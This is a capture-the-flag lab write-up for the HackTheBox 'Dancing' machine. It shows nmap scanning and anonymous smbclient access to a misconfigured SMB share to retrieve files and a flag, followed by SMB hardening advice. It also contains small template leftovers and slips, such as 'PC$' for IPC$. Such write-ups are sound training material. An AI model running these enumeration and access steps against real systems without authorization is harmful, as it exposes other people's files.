---
Box: Dancing
Ip: 10.129.152.203
Date: 2025-10-23
Difficulty: Easy
Author: Somnath
Os: Linux
Summary: Missconfigured SMB (Server Message Block) allows access to read the messages anonmounsly.
---

# Dancing — Easy

**Author:** Somnath  
**IP:** 10.129.152.203  
**OS:** Linux  
**Date:** 2025-10-23  

## Summary
Missconfigured SMB (Server Message Block) allows access to read the messages anonmounsly.

---

## Enumeration
**Nmap command:**  
\`\`\`bash
nmap -sC -sV -oN nmap_initial.txt 10.129.152.203
\`\`\`

**Key ports / services:**  
- 445 - SMB (Server Message Block) runs on port 445

**Web discovery (gobuster/ferox):**  
- `/admin` — note

---

## Initial Access
**Vector / vuln:**  
- Explanation of the vulnerability. - The WorkShares SMB share was poorly configured, allowing us to log in without the appropriate credentials. We can see our terminal prompt changed to smb: \> , letting us know that our shell is now interacting with the service. We can use the help command to see what we can do within this shell.

**Commands used / exploit:**  
\`\`\`bash
	1. ping 10.129.152.203
	2. sudo nmap -sV 10.129.152.203
	3. smbclient -L 10.129.152.203
	4. smbclient \\\\10.129.152.203\\WorkShares 
	5. ls
	6. cd Amy.j
	7. ls
	8. get workstations.txt
	9. exit
	10. cat flag.txt

# example commands/payloads used
\`\`\`
	No external payloads were used

**Screenshot:** `Attachments/Dancing/initial_shell.png`
 1. ![[Pasted image 20251021205729.png]]
 2. ![[Pasted image 20251021211026.png]]
	- ADMIN$ - Administrative shares are hidden network shares created by the Windows NT family of operating systems that allow system administrators to have remote access to every disk volume on a network-connected system. These shares may not be permanently deleted but may be disabled. 
	- C$ - Administrative share for the C:\ disk volume. This is where the operating system is hosted. I
	- PC$ - The inter-process communication share. Used for inter-process communication via named pipes and is not part of the file system. 
	- WorkShares - Custom share.
 3. ![[Pasted image 20251021211608.png]]
 4. ![[Pasted image 20251021212115.png]]
  5.  ![[Pasted image 20251021212346.png]]
   6. ![[Pasted image 20251021212652.png]]


---

## Mitigation
- **Disable anonymous/guest access** immediately to prevent unauthorized logins.
- **Restrict SMB share access** to specific trusted users or groups only (avoid Everyone/Anonymous).
- **Enforce strong authentication** for all accounts accessing the share (complex, unique passwords; MFA for admins if possible).
- **Remove sensitive files** (backups, configs, credentials) from shared directories accessible to users.
- **Use SMB signing and encryption** to protect data in transit.
- **Review and harden share and NTFS/Samba permissions**, ensuring least-privilege access (read/write only where necessary).
- **Regularly audit SMB shares and access logs** to detect unauthorized access or suspicious activity.
- **Apply principle of least privilege** to all SMB service accounts and underlying file system objects.
- **Update and patch SMB server software** (Windows updates or Samba) to the latest stable version to mitigate known vulnerabilities.
- **Implement network segmentation and firewall rules** to allow SMB access only from trusted subnets or VPN connections.

## Takeaways / Notes
- There are multiple ways to transfer a file between two hosts (computers) on the same network. One of these protocols is studied in this example, and that is SMB (Server Message Block). This communication protocol provides shared access to files, printers, and serial ports between endpoints on a network. We mostly see SMB services running on Windows machines. During scanning, we will typically see port 445 TCP open on the target, reserved for the SMB protocol. Usually, SMB runs at the Application or Presentation layers of the OSI model, pictured below. Due to this, it relies on lower-level protocols for transport. The Transport layer protocol that Microsoft SMB Protocol is most often used with is NetBIOS over TCP/IP (NBT). This is why, during scans, we will most likely see both protocols with open ports running on the target. 
- Using the SMB protocol, an application (or the user of an application) can access files at a remote server, along with other resources such as printers. Thus, a client application can read, create, and update files on the remote server. It can also communicate with any server program that is set up to receive an SMB client request.

## Artifacts
- Attachments folder: `HackTheBox/Dancing/`

